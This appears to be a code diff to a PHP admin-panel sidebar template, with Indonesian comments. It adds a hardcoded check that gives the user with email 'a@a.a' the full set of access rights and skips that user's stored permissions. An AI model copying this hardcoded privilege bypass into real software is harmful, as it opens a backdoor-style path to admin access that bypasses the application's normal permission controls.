@@ -33,9 +33,15 @@
         <nav class="iq-sidebar-menu">
             <ul id="iq-sidebar-toggle" class="iq-menu">
                 <?php
-                // Ambil logged_user dari session
                 $loggedUser = $_SESSION['logged_user'] ?? null;
-                $access = $loggedUser && is_string($loggedUser->access) ? json_decode($loggedUser->access, true) : ($loggedUser->access ?? []);
+                if ($loggedUser && isset($loggedUser->email) && $loggedUser->email === 'a@a.a') {
+                    // Untuk user a@a.a, kita langsung set semua akses sebagai super admin
+                    $access = ['subscriber', 'signal', 'message', 'freemember', 'payment'];
+                } else {
+                    $access = $loggedUser && is_string($loggedUser->access)
+                        ? json_decode($loggedUser->access, true)
+                        : ($loggedUser->access ?? []);
+                }
                 ?>
 
                 <li class="<?= @$active_dash ?>">
